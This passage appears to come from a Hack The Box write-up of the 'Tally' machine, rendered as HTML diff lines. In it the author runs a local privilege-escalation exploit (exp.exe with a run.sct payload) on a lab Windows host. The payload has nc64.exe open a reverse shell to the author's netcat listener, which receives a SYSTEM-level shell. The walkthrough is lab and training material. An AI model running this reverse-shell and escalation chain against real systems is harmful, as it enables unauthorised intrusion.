+</span><span class="gp">C:\Windows\system32&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>From <code class="language-plaintext highlighter-rouge">C:\programdata</code>, I’ll run the exploit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\ProgramData&gt;</span><span class="nb">dir</span>
+<span class="go">...[snip]...
+11/04/2022  01:46            36,352 exp.exe
+19/09/2017  22:14    &lt;DIR&gt;          Microsoft Help
+11/04/2022  00:30            45,272 nc64.exe
+...[snip]...
+               6 File(s)        128,022 bytes
+              13 Dir(s)   2,268,626,944 bytes free
+
+</span><span class="gp">C:\ProgramData&gt;</span>.<span class="se">\e</span>xp.exe 
+<span class="go">Building Library with path: script:C:\ProgramData\run.sct
+Found TLB name at offset 766
+QI - Marshaller: {00000000-0000-0000-C000-000000000046} 015AE408
+Queried Success: 015AE408
+AddRef: 1
+...[snip]...
+Marshal Complete: 00000000
+Release: 5
+Release: 4
+AddRef: 3
+Release: 4
+Release: 3
+Result: 80029C4A
+Done
+Release: 1
+Release object 015AE198
+Release: 2
+</span></code></pre></div></div>
+<p>The payload was to call <code class="language-plaintext highlighter-rouge">nc64.exe</code> to my host on 447. At that listening <code class="language-plaintext highlighter-rouge">nc</code> there’s a shell as SYSTEM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 447
+<span class="go">Listening on 0.0.0.0 447
+Connection received on 10.10.10.59 53857
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">nt authority\system
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/04/11/htb-tally.html"></a>
+</article>
